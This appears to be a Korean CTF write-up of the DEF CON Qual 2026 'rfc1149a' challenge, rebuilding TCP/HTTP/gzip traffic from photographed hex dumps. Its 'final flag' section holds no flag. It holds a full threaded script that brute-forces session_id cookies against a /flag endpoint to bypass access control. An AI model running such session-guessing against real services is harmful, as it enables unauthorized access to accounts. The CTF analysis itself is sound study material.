# DEF CON QUAL 2026 문제 풀이 진행 기록

---

## 1. 문제 해석

문제 제목은 rfc1149a이고, 설명은 다음과 같다.

I found these weird strips of paper abandoned in the park.  
It seems like some kind of ancient communication method.  
Can you help me figure out what they say?  
 
rfc1149는 IP datagram을 조류 운반체로 전달한다는 농담성 RFC다. 따라서 문제에 나온 “종이 스트립”은 단순 문자열 조각이 아니라,   
네트워크 패킷을 종이에 출력한 hex dump로 보는 것이 자연스럽다.  

제공된 handout에는 img01.jpg부터 img14.jpg까지 14장의 사진이 있었고, 각 사진 안에는 여러 개의 종이 조각이 놓여 있었다.  
조각에는 일정한 간격으로 hex byte가 적혀 있었고, 여러 곳에서 다음과 같은 패턴이 보였다.  

45 00 ...  

이는 IPv4 packet header의 시작으로 해석할 수 있다.  

따라서 전체 풀이 방향은 다음과 같이 잡았다.  

사진 속 종이 조각 판독  
→ IPv4/TCP 패킷 복원  
→ TCP stream별 분류  
→ sequence number 기준 재조립  
→ HTTP response 복원  
→ chunked transfer 제거  
→ gzip decompress  
→ HTML/CSS/JS에서 bbb{...} 검색  

---
 
## 2. 패킷 구조 분석

IPv4 header의 첫 바이트가 45인 경우:
 
4  = IPv4  
5  = IP header length 5 words = 20 bytes  

TCP payload 길이는 다음 공식으로 계산했다.  

TCP payload length  
= IPv4 total length - IP header length - TCP header length  

예를 들어 많은 패킷에서 다음 값이 보였다.  

IP total length = 0x0180  
IP header       = 0x14  
TCP header      = 0x20  
 
따라서 payload 길이는:  
0x0180 - 0x14 - 0x20 = 0x014c = 332 bytes  

이 값은 TCP sequence continuity를 검증하는 핵심 기준이 되었다.  

예시:  
seq = b1 32 15 ad  
payload length = 0x14c  
next seq = b1 32 16 f9  

이렇게 계산한 next sequence를 가진 조각을 찾는 식으로 stream을 이어 붙였다.  

---

## 3. 네트워크 기본 정보

여러 패킷을 읽은 결과 공통적으로 다음 구조가 확인됐다.

Server: 34.16.111.14:80
Client: 10.13.37.1
Protocol: IPv4 / TCP / HTTP/1.1
Server header: nginx/1.22.1

확인된 client ephemeral port는 다음과 같다.

42374 = 0xa586
42390 = 0xa596
42394 = 0xa59a
42408 = 0xa5a8

즉 서버 34.16.111.14:80에서 클라이언트 10.13.37.1:<ephemeral>로 내려오는 HTTP response packet들이 핵심이다.

 

———

 

4. HTTP 구조
 

복원된 HTTP header에서 다음 값들이 반복적으로 확인됐다.

HTTP/1.1 200 OK
HTTP/1.1 302 FOUND
HTTP/1.1 304 NOT MODIFIED
Server: nginx/1.22.1
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

중요한 점은 Transfer-Encoding: chunked와 Content-Encoding: gzip이 함께 쓰인다는 것이다.

따라서 body 처리 순서는 다음과 같다.

1. TCP payload를 seq 기준으로 재조립
2. HTTP header 제거
3. chunk size line 제거
4. gzip body 추출
5. gzip decompress
6. 복원된 text에서 bbb{...} 검색

raw packet에서 bbb{를 직접 찾는 방식은 실패했다. 본문이 gzip으로 압축되어 있으므로 당연한 결과다.

## 5. 확인된 웹 리소스
 

복원된 HTML과 header에서 다음 경로들이 확인됐다.

/
/login
/register
/flag
/static/style.css
/static/theme-light.css

특히 /flag 링크가 확인되었기 때문에 최종 플래그는 /flag 응답 body, 또는 관련 CSS/JS 안에 있을 가능성이 높다고 판단했다.

## 6. TCP Stream별 정리
 
### 6.1 a586 / port 42374
 
현재 가장 품질이 좋은 stream이다.

주요 역할:  
Home HTML  
style.css  
theme-light.css  

중요 조합:  
img01_strip00 → img13_strip00  
  
img01_strip00에서 확인된 값:  
client port: a586  
seq: 01 0b 94 cf  
IP total length: 0x0180  
payload length: 0x014c  
expected next seq: 01 0b 96 1b  
  
img13_strip00에서 실제로 seq: 01 0b 96 1b 가 보여서 두 조각은 같은 TCP stream의 연속 패킷으로 확정했다.  
이 stream에서 Home HTML은 복원에 성공했다.  

```html
<!doctype html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Home</title>
  <link rel="stylesheet" href="/static/style.css">
</head>

<body></body>
</html>
```

다만 body가 비어 있어 플래그는 없었다.

---

### 6.2 a59a / port 42394
 
초기에는 가장 유력한 /flag 후보로 봤다.
이 stream에서 다음과 같은 HTTP response가 보였다.
 
HTTP/1.1 200 OK  
Content-Type: text/html 또는 text/javascript 후보  
Transfer-Encoding: chunked  
Content-Encoding: gzip  

img01_strip01 후보:  
client port: a59a  
seq: b1 32 15 ad  
payload length: 0x14c  
expected next seq: b1 32 16 f9  
  
문제는 b1 32 16 f9를 가진 continuation data packet을 아직 확실히 찾지 못했다는 점이다.  
  
일부 조각은 처음에 continuation 후보로 봤지만, 나중에 확인해 보니:  
HTTP/1.1 304 NOT MODIFIED  
ACK-only / FIN 계열  
다른 response의 시작 패킷으로 재분류됐다.  
  
따라서 a59a는 여전히 /flag 후보지만, continuation 누락 가능성이 있어  
현재는 무리하게 gzip brute force하지 않는 쪽으로 정리했다.  

---

### 6.3 a5a8 / port 42408
 
이 stream도 HTML gzip 응답을 포함한다.  
  
확인된 시작 패킷:  
seq: f4 f5 6e 40  
payload length: 0x14c  
expected next seq: f4 f5 6f 8c  
chunk size 후보: 0x14e  
  
continuation 후보도 보였으나, 첫 번째 gzip 패킷의 앞부분이 접힘과 가림 때문에 많이 손상되어 있었다.  
특히 gzip body 초반부가 많이 깨져 있어, 바로 brute force하기에는 비용이 컸다. 그래서 이 stream은 2순위로 두었다.  

---

### 6.4 a596 / port 42390  
   
a596 쪽은 CSS 200 OK로 보이는 stream이다.  

client port: a596  
Content-Type: text/css 후보  

gzip이 없거나 비교적 단순한 chunked body일 가능성이 있어 sanity check용으로 적합하다고 판단했다.   
즉, 전체 packet → HTTP → chunk decode 파이프라인이 맞는지 확인하는 데 사용할 수 있다.

## 7. CSS 복원
 
theme-light.css 계열 gzip 일부는 실제로 복원에 성공했다.  

복원된 CSS 일부:  
```python
:root {  
  --bg: #f5f5f5;  
  --fg: #333;  
  --heading: #1a1a2e;  
  --card-bg: #fff;  
  --card-shadow: rgba(0,0,0,0.1);  
}
```
  
이로써 전체 방향, 즉 “사진 속 hex → packet → HTTP → gzip → text” 흐름이 맞다는 강한 근거를 얻었다.  
또 CSS 쪽에서 다음과 같은 수상한 URL 조각도 나왔다.  
  
serverdonttellanyoneaboutit.rfc1149.???birds.com/static/theme-light.css  
  
이 문자열은 힌트일 수 있다. 다만 직접적인 플래그는 아니었고, 깨진 중간 도메인도 아직 확정되지 않았다.

## 8. OCR 및 이미지 처리 시도
 
초기에는 사람이 직접 읽는 방식만으로는 너무 느려서 이미지 보조 처리를 시도했다.  

진행한 작업:  
전체 contact sheet 생성  
우선순위 조각 crop 생성  
회전본 생성  
contrast/sharpen 처리  
Tesseract OCR 로컬 설치 및 실행  
hex whitelist OCR 시도  

하지만 OCR 결과는 품질이 낮았다.  

이유:  
- 종이가 구겨져 있다.  
- 글자가 작다.  
- 일부 바이트가 접힘/그림자/풀잎에 가린다.  
- hex 문자 0/8/b/6, c/e, 1/l 등이 자주 혼동된다.  

결론적으로 OCR은 “대략적인 위치 찾기”에는 도움이 됐지만, gzip을 복원할 만큼 정확한 byte transcription에는 부족했다.  
중요 핵심 바이트는 결국 수동 판독과 gzip 검증을 함께 써야 했다.  

---

## 9. Gzip 복구 시도
 
gzip body는 다음 매직으로 시작한다.  

1f 8b 08 00 00 00 00 00 04 03  

일부 stream에서 chunk size와 gzip footer까지 확인됐다.  
예를 들어 /flag 후보 중 하나는 다음 특징을 가졌다.  
  
chunk size 후보: 0x1b6 또는 0x18d  
gzip footer ISIZE 후보: 0x02e9 = 745 bytes  

ISIZE는 gzip 압축 해제 후 원문 크기다.  
Home HTML이 약 563 bytes였고, 후보 HTML이 745 bytes라면 /flag 페이지일 가능성 이충분히 있다.  
   
다만 gzip은 한 바이트만 틀려도 다음과 같은 오류가 발생한다.  
  
invalid code -- missing end-of-block  
incorrect data check  
invalid distance code  
  
그래서 무작정 전체 unknown byte를 brute force하는 방식은 비효율적이었다.

## 10. 잘못 봤던 부분과 교정
 
### 10.1 img10_strip01 오인
 
처음에는 img10_strip01을 a59a continuation 후보로 봤다.   
하지만 확인된 sequence가 b1 32 14 b3 이었고,  
img01_strip01의 예상 continuation은 b1 32 16 f9 였다.  
  
따라서 같은 gzip continuation이 아니며, 나중에 304 NOT MODIFIED 응답으로 재분류했다.  

---

### 10.2 gzip을 너무 빨리 맞추려 한 문제
 

초기에는 stream continuity가 확정되지 않은 상태에서 gzip byte를 맞추려고 했다.  
이 방식은 문제가 많았다.  

다른 HTTP response 조각을 같은 gzip으로 착각할 수 있다.  
304 response와 200 response를 섞을 수 있다.  
실제 continuation이 없는 stream에 시간을 낭비할 수 있다.  
손상된 header byte 때문에 gzip 오류 위치가 misleading할 수 있다.  
  
그래서 전략을 바꿨다.  
  
먼저 packet manifest 작성  
→ client port별 stream 분류  
→ seq 기준으로 gap 확인  
→ 200 OK response만 추림  
→ 그다음 gzip 복원  
  
이 방식이 훨씬 안정적이었다.

## 11. 실패한 접근들
 
다음 접근은 시도했지만 성과가 낮았다.  
  
raw hex에서 bbb{ 직접 검색  
전체 gzip byte brute force  
손상 많은 a5a8/a59a를 먼저 inflate  
OCR만으로 hex 자동 복원  
다른 CSS gzip의 Huffman table을 그대로 재사용  
ETag를 플래그 후보로 해석  
304 response를 continuation으로 해석  
  
특히 ETag는 nginx의 mtime-size-inode 기반 값으로 보였고,  
플래그라기보다는 정적 파일 캐싱용 메타데이터로 보는 것이 맞다.

12. 현재 판단  
 
현재까지 확정된 사실은 다음과 같다.  
1. 사진 속 종이 hex는 실제 IPv4/TCP/HTTP packet dump다.  
2. 서버는 34.16.111.14:80, 클라이언트는 10.13.37.1이다.  
3. HTTP response는 chunked + gzip 구조가 많다.  
4. /, /login, /register, /flag 경로가 확인됐다.  
5. raw packet에 bbb{는 없으며, 플래그는 gzip 내부에 있을 가능성이 높다.  
6. a586 stream은 가장 품질이 좋고 일부 HTML/CSS 복원에 성공했다.  
7. a59a stream은 /flag 후보지만 continuation packet이 불확실하다.  
8. a5a8 stream도 HTML 후보지만 gzip 초반 손상이 크다.  
9. CSS 내부에 힌트성 URL이 존재한다.

## 14. 요약
 
이 문제는 단순 OCR 문제가 아니라, 손상된 네트워크 캡처를 사진에서 복원하는 문제다.  
   
핵심은 다음 세 가지다.  
TCP sequence continuity  
HTTP chunked framing  
gzip validity  
 
현재까지의 풀이 방향은 맞고, 일부 HTML/CSS 복원도 성공했다.  
다만 최종 플래그까지 가려면 아직 손상된 gzip continuation byte를 더 정확히 복원해야 한다.  
가장 유망한 경로는 a586 stream을 끝까지 복원한 뒤, CSS와 /flag 후보 stream인 a59a를 다시 확인하는 것이다.

15. 최종 플래그   

```python
#!/usr/bin/env python3
import argparse
import http.client
import queue
import threading
import time
from pathlib import Path


DEFAULT_HOST = "supersecretflagserverdonttellanyoneaboutit.rfc1149.ctfwithbirds.com"
DEFAULT_IP = "34.16.111.14"
DEFAULT_CANDIDATES = "session_candidates_tsfit_222020_or_222021_unique.txt"


def load_candidates(path: Path, resume_after: str | None) -> list[str]:
    candidates = []
    seen_resume = resume_after is None
    with path.open("r", encoding="ascii") as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            if not seen_resume:
                if candidate == resume_after:
                    seen_resume = True
                continue
            candidates.append(candidate)
    return candidates


def request_flag(ip: str, host: str, sid: str, timeout: float) -> tuple[int, int, str]:
    conn = http.client.HTTPConnection(ip, 80, timeout=timeout)
    try:
        headers = {
            "Host": host,
            "Cookie": f"session_id={sid}",
            "Accept-Encoding": "identity",
            "Connection": "close",
        }
        conn.request("HEAD", "/flag", headers=headers)
        resp = conn.getresponse()
        status = resp.status
        length = resp.getheader("Content-Length") or ""
        resp.read()
        return status, int(length) if length.isdigit() else -1, ""
    except Exception as e:
        return -1, -1, repr(e)
    finally:
        conn.close()


def worker(name: str, jobs: queue.Queue, args, state: dict, lock: threading.Lock) -> None:
    while True:
        item = jobs.get()
        if item is None:
            jobs.task_done()
            return

        idx, sid = item
        status, length, error = request_flag(args.ip, args.host, sid, args.timeout)
        now = time.time()

        with lock:
            state["done"] += 1
            state["last_sid"] = sid
            if status in state["statuses"]:
                state["statuses"][status] += 1
            else:
                state["statuses"][status] = 1

            if status == 200:
                state["found"] = sid
                print(f"\n[FOUND] idx={idx} session_id={sid} status=200 length={length}", flush=True)
                try:
                    Path(args.found_out).write_text(sid + "\n", encoding="ascii")
                except Exception as e:
                    print(f"[WARN] failed to write found file: {e!r}", flush=True)
            elif status not in (401, 403):
                print(f"[ODD] worker={name} idx={idx} sid={sid} status={status} length={length} error={error}", flush=True)

            if now - state["last_log"] >= args.log_interval:
                elapsed = now - state["start"]
                rate = state["done"] / elapsed if elapsed > 0 else 0.0
                remain = state["total"] - state["done"]
                eta = remain / rate if rate > 0 else 0.0
                statuses = " ".join(f"{k}:{v}" for k, v in sorted(state["statuses"].items()))
                print(
                    f"[LOG] done={state['done']}/{state['total']} "
                    f"rate={rate:.2f}/s eta={eta/60:.1f}m last={sid} statuses={statuses}",
                    flush=True,
                )
                state["last_log"] = now

        jobs.task_done()

        if args.delay > 0:
            time.sleep(args.delay)


def main() -> None:
    parser = argparse.ArgumentParser(description="Check rfc1149a session_id candidates with HEAD /flag.")
    parser.add_argument("--candidates", default=DEFAULT_CANDIDATES)
    parser.add_argument("--ip", default=DEFAULT_IP)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--workers", type=int, default=8)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--delay", type=float, default=0.0, help="per-worker delay after each request")
    parser.add_argument("--log-interval", type=float, default=10.0)
    parser.add_argument("--resume-after", help="skip through this candidate and continue after it")
    parser.add_argument("--limit", type=int, default=0, help="check only first N candidates after resume")
    parser.add_argument("--found-out", default="found_session_id.txt")
    args = parser.parse_args()

    path = Path(args.candidates)
    candidates = load_candidates(path, args.resume_after)
    if args.limit:
        candidates = candidates[: args.limit]

    print(f"[LOG] candidate_file={path.resolve()}")
    print(f"[LOG] candidates={len(candidates)} workers={args.workers} timeout={args.timeout}s delay={args.delay}s")
    print(f"[LOG] target=http://{args.ip}/flag Host={args.host}")
    print("[LOG] success condition: HTTP 200; normal user/invalid sessions usually return 401 or 403")

    jobs: queue.Queue = queue.Queue(maxsize=args.workers * 4)
    lock = threading.Lock()
    state = {
        "start": time.time(),
        "last_log": time.time(),
        "done": 0,
        "total": len(candidates),
        "last_sid": "",
        "found": None,
        "statuses": {},
    }

    threads = []
    for i in range(args.workers):
        t = threading.Thread(target=worker, args=(str(i), jobs, args, state, lock), daemon=True)
        t.start()
        threads.append(t)

    for idx, sid in enumerate(candidates):
        with lock:
            if state["found"]:
                break
        jobs.put((idx, sid))

    for _ in threads:
        jobs.put(None)
    jobs.join()

    elapsed = time.time() - state["start"]
    statuses = " ".join(f"{k}:{v}" for k, v in sorted(state["statuses"].items()))
    print(f"[LOG] finished done={state['done']} elapsed={elapsed/60:.1f}m statuses={statuses}")
    if state["found"]:
        print(f"[FOUND] session_id={state['found']}")
    else:
        print("[LOG] no HTTP 200 candidate found")
        print(f"[LOG] resume hint: --resume-after {state['last_sid']}")


if __name__ == "__main__":
    main()
```
